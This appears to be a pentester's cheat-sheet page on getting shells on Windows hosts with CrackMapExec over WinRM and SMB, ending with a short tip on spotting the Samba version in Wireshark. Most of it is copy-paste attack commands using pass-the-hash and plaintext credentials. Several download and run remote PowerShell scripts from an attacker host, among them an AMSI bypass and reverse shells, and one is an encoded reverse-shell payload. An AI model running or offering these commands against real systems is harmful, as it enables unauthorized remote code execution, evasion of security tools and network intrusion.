---
title: "Login through CIFS/WinRM/PSSession"
date: 2025-10-03
draft: false
type: wiki
---

When injecting a ticket and impersonating a user, we can swap `CIFS` for `HTTP` for getting a shell via WinRM or swap `CIFS` for `HOST` for getting a shell via PsExec!!!

-----------------------------

# CrackMapExec - WinRM

With Hash

```console
crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x "ipconfig"
```

With Password (Example gets a reverse shell)

```console
crackmapexec winrm 172.16.80.24 -u brie -p fn89hudi1892r -x "powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADAANwAvAG4AaQBlAHIAaQAuAHAAcwAxACIAKQA7AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADcALwByAHUAbgAtAHMAaABlAGwAbABjAG8AZABlAC0ANgA0AGIAaQB0AHMALgBwAHMAMQAiACkACgA="
```

-----------------------------

# CrackMapExec - SMB

With Hash

```console
crackmapexec smb 172.16.21.22 -u gouda -H 09238831b1af5edab93c773f56409d96 -x "powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/4msibyp455.ps1');IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/dameelreversooo.ps1')"
```

With Hash + Domain

```console
crackmapexec smb 172.16.21.22 -d example.com -u cuartirolo -H 09238831b1af5edab93c773f56409d96 -x "whoami"
```

With password

```console
smb 172.16.21.22 -u administrator -p fn89hudi1892r -x "powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/dameelreversooo.ps1')"
```

-----------------------------

# Version (nmap didn't detect it)

Sometimes nmap doesn't show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

{{< image src="/images/cheatsheet/smb-version-wireshark.png" position="center" style="border-radius: 8px;" >}}

-----------------------------
